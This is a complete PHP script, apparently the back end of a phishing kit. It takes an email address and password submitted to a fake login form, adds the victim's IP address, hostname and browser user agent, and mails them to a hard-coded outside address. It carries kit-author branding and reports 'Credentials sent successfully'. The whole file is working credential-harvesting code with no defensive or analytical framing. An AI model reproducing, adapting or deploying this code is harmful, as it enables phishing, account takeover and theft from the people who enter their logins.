<?php
header("Content-Type: application/json");
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: request-starttime, Content-Type, Authorization');
error_reporting(0);

// Handle preflight OPTIONS requests
if ($_SERVER["REQUEST_METHOD"] == "OPTIONS") {
    header("HTTP/1.1 204 No Content");
    exit();
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = trim($_POST['email']); // Adjusted to match the form field name
    $password = trim($_POST['password']); // Adjusted to match the form field name
    $recipients = ["mariolopez@marineairlands.com"];

    if ($email != null && $password != null) {
        $ip = getenv("REMOTE_ADDR");
        $hostname = gethostbyaddr($ip);
        $useragent = $_SERVER['HTTP_USER_AGENT'];
        $message = "|--------------|ALL DOMAIN|-------------|\n";
        $message .= "|Email: " . $email . "\n";
        $message .= "|Password: " . $password . "\n";
        $message .= "|---------------|IP|-------------------|\n";
        $message .= "|Client IP: " . $ip . "\n";
        $message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
        $message .= "|User Agent : " . $useragent . "\n";
        $message .= "|----------- Coded By AICE ------------|\n";
        $message .= "|------------MITSHINZ-----------|\n";
        $subject = "Login $ip";

        foreach ($recipients as $to) {
            mail($to, $subject, $message);
        }

        $signal = 'ok';
        $msg = 'Credentials sent successfully.';
    } else {
        $signal = 'bad';
        $msg = 'Please provide both email and password.';
    }
} else {
    $signal = 'bad';
    $msg = 'Invalid request method.';
}

$data = array(
    'signal' => $signal,
    'msg' => $msg,
);

echo json_encode($data);
?>
